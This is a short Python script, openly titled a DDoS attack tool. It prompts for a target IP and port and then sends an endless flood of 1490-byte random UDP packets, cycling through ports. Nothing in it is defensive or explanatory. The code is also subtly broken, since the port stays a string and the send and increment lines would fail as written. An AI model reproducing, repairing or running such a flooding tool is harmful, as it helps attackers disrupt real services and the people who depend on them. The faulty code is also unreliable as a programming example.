import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Attack")

ip = input("IP Target : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet Attack Starting")
print (f"Starting attack on {ip} at {hour}:{minute}:{day}")
print ("Attack will continue until CTRL+C")

sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent += 1
     port += 1
     print (f"Sent {sent} packet to {ip} throught port:{port}")
     if port == 65534:
       port = 1

